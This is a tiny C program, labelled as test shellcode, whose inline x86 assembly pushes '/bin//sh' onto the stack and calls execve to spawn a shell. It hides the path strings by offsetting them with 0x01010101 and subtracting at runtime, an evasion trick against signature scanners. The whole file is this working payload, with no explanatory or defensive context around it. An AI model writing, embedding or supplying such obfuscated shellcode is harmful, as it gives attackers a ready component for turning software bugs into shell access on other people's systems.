// Simple execve /bin/sh shellcode for testing
int main() {
    __asm__(
        "xor %eax, %eax\n"
        "push %eax\n"
        // "//sh" -> 0x68732f2f. Obfuscated by subtracting 0x01010101
        "mov $0x69743030, %ebx\n"
        "sub $0x01010101, %ebx\n"
        "push %ebx\n"
        // "/bin" -> 0x6e69622f. Obfuscated by subtracting 0x01010101
        "mov $0x6f6a6330, %ebx\n"
        "sub $0x01010101, %ebx\n"
        "push %ebx\n"
        "mov %esp, %ebx\n"
        "push %eax\n"
        "push %ebx\n"
        "mov %esp, %ecx\n"
        "mov $0xb, %al\n"
        "int $0x80\n"
    );
    return 0;
}
